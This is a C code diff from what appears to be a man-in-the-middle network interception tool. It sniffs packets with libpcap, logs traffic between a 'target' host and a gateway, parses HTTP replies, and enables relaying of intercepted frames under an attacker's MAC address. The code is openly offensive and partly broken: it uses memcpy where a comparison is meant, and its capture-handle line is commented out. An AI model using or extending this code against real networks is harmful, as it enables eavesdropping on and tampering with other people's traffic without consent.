@@ -200,7 +200,7 @@ int sniffer_init(sni_info* info,char* errbuf){
                 log_printf(MSG_DEBUG,"the attacker's ip  is " IPv4STR,IPv42STR(info->attacker_ip));
 	}
 
-	info->handle = pcap_open_live(info->dev,65536,1,100,errbuf); // set to promiscous mode to get packet
+	//info->handle = pcap_open_live(info->dev,65536,0,100,errbuf); 
 	return 0;
 }
 
@@ -216,6 +216,8 @@ void anylysis_packet(u_char* user,const struct pcap_pkthdr* hp ,const u_char* pa
 			tcp_header* pTcp;
 			switch (pIpv4->protocol_type){
 				case PROTOCOL_ICMP :
+					log_printf(MSG_INFO,IPv4STR " icmp to " IPv4STR ,IPv42STR(pIpv4->src_ip),
+                                                IPv42STR(pIpv4->dest_ip) );
 				break;
 				case PROTOCOL_TCP : ;
 					pTcp = (tcp_header*) (packet + header_len);
@@ -233,7 +235,7 @@ void anylysis_packet(u_char* user,const struct pcap_pkthdr* hp ,const u_char* pa
 							 http_reply_payload payload;
 							 parse_http_reply(packet+header_len,&payload);
 					}
-				log_printf(MSG_INFO,IPv4STR " : %d >> " IPv4STR " : %d",IPv42STR(pIpv4->src_ip),
+					log_printf(MSG_INFO,IPv4STR " : %d >> " IPv4STR " : %d",IPv42STR(pIpv4->src_ip),
 						pTcp->sour_port,IPv42STR(pIpv4->dest_ip),pTcp->dest_port );
 				break;
 				case PROTOCOL_UDP : ;
@@ -256,19 +258,16 @@ void anylysis_packet(u_char* user,const struct pcap_pkthdr* hp ,const u_char* pa
 		break;
 	}
 	if(memcpy(pEther->SRC_mac,info->TARGET_MAC,6)){	
-		log_printf(MSG_DEBUG,"get a package from target,forward to gateway");
-//		forword(info->dev,ntohs(pEther->eth_type),info->GATEWAY_IP,pEther->SRC_mac,
-//			packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));
+		forword(info->dev,ntohs(pEther->eth_type),info->GATEWAY_MAC,info->ATTACKER_MAC,
+			packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));
 	}
 	if(memcpy(pEther->SRC_mac,info->GATEWAY_MAC,6)){
-		log_printf(MSG_DEBUG,"get a package from gateway,forward to target");
-//		forword(info->dev,ntohs(pEther->eth_type),info->TARGET_MAC,pEther->SRC_mac,
-//				packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));
+		forword(info->dev,ntohs(pEther->eth_type),info->TARGET_MAC,info->ATTACKER_MAC,
+				packet+sizeof(ethernet_header),hp->len-sizeof(ethernet_header));
 	}	
 }
 
 void* capute(void* mitm_info){
-	log_printf(MSG_DEBUG,"=======capute pcaket come from target=======");
 	pcap_t* handle;
 	MITM_info* info = (MITM_info*)mitm_info;
 	struct bpf_program bpf;
@@ -293,7 +292,8 @@ void* capute(void* mitm_info){
 		pcap_close(handle);
 		return NULL;
 	}
+	log_printf(MSG_DEBUG,"init interface successful,start to capute package");
 	pcap_loop(handle,100,anylysis_packet,(u_char*)info);
-
-
+	pcap_close(handle);
+	return 0;
 }
